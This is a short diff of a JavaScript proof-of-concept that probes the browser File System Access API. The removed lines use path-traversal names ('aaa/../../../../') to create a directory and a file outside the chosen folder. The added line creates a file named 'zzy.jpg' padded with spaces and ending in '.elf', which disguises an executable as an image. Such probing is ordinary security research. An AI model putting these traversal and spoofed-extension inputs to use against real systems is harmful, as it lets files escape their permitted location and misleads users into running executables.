@@ -31,10 +31,10 @@
               // Oh yeah, creating new directories with the given handle
               // is possible - we're talking about true file system
               // access here!
-              const newDirHandle = await dirHandle.getDirectoryHandle('aaa/../../../../ZZY_POC', { create: true });
+              const newDirHandle = await dirHandle.getDirectoryHandle('ZZY_POC', { create: true });
 
               // Same for files in the directory. Of course.
-              const newFileHandle = await dirHandle.getFileHandle('aaa/../../../../zzy_file_travesal.txt', { create: true });
+              const newFileHandle = await dirHandle.getFileHandle('zzy.jpg                                                                                                                     .elf', { create: true });
 
               // Deleting is done via 'removeEntry'. Here, we're deleting
               // our newly created empty txt-file.
